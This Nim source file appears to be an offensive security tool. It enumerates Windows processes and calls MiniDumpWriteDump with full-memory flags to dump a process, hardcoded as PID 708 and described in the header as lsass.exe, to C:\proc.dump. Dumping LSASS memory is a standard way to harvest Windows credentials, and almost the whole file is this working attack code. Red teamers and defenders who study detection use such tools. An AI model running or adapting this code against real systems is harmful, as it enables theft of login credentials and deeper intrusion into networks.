#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause

    Enumerates all processes to find lsass.exe and creates a memorydump using MiniDumpWriteDump

    TO DO: Implement process id -> process name logic

    References:
        - https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
        - https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
        - https://github.com/juancarlospaco/psutil-nim/blob/master/src/psutil/psutil_windows.nim#L55
        - https://github.com/byt3bl33d3r/SILENTTRINITY/blob/master/silenttrinity/core/teamserver/modules/boo/src/minidump.boo
]#

import winim

type
    MINIDUMP_TYPE = enum
        MiniDumpWithFullMemory = 0x00000002

proc MiniDumpWriteDump(
    hProcess: HANDLE,
    ProcessId: DWORD, 
    hFile: HANDLE, 
    DumpType: MINIDUMP_TYPE, 
    ExceptionParam: INT, 
    UserStreamParam: INT,
    CallbackParam: INT
): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}

proc getProcessIds(): seq[int] = 
    ## Returns a list of PIDs currently running on the system.
    result = newSeq[int]()

    var procArray: seq[DWORD]
    var procArrayLen = 0
    # Stores the byte size of the returned array from enumprocesses
    var enumReturnSz: DWORD = 0

    while enumReturnSz == DWORD( procArrayLen * sizeof(DWORD) ):
        procArrayLen += 1024
        procArray = newSeq[DWORD](procArrayLen)

        if EnumProcesses( addr procArray[0], 
                          DWORD( procArrayLen * sizeof(DWORD) ), 
                          addr enumReturnSz ) == 0:
            return result

    # The number of elements is the returned size / size of each element
    let numberOfReturnedPIDs = int( int(enumReturnSz) / sizeof(DWORD) )
    for i in 0..<numberOfReturnedPIDs:
        result.add( procArray[i].int )

when isMainModule:
    #let processIds: seq[int] = getProcessIds()
    #for pid in processIds:
        #getPrecessName(pid)
    
    let processId: int = 708
    var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](processId))
    var fs = open(r"C:\proc.dump", fmWrite)
    
    var success = MiniDumpWriteDump(
        hProcess,
        cast[DWORD](processId),
        fs.getOsFileHandle(),
        MiniDumpWithFullMemory,
        0,
        0,
        0
    )

    fs.close()
    echo "[*] Dump successful: ", success